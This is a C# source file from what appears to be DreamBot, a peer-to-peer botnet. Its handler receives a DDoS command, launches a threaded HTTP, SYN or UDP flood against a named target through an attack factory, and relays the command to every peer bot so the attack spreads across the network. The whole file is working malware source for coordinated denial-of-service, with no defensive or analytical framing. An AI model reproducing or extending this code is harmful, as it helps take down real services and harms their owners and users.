using System;
using System.Collections.Generic;
using DreamBot.Actions.DDoS;
using DreamBot.Network.Protocol.Messages;
using DreamBot.Network.Protocol.Messages.Command;
using DreamBot.Network.Protocol.Peers;

namespace DreamBot.Network.Protocol.Handlers.Command
{
    class DosAttackHandler : IMessageHandler
    {
        private static readonly Dictionary<long, Attacker> Attackers = new Dictionary<long, Attacker>();

        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;
        public DosAttackHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as DosAttackMessage;
            if (Attackers.ContainsKey(msg.AttackId))
            {
                return;
            }

            var attack = AttackFactory.Create(msg);
            var attacker = new Attacker(msg.Threads, attack);
            attacker.Start();
            Attackers.Add(msg.AttackId, attacker);

            foreach (var peer in _peerList)
            {
                _messageManager.Send(msg, peer.BotId, 0, botMessage.Header.Ttl--);
            }
        }
    }

    static class AttackFactory
    {
        public static Attack Create(DosAttackMessage msg)
        {
            switch (msg.Type)
            {
                case DosAttackMessage.DosType.HttpFlood:
                    return new HttpFlood(msg.Target, msg.Buffer);
                case DosAttackMessage.DosType.SynFlood:
                    return new SynFlood(msg.Target);
                case DosAttackMessage.DosType.UdpFlood:
                    return new UdpFlood(msg.Target);
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }
    }
}
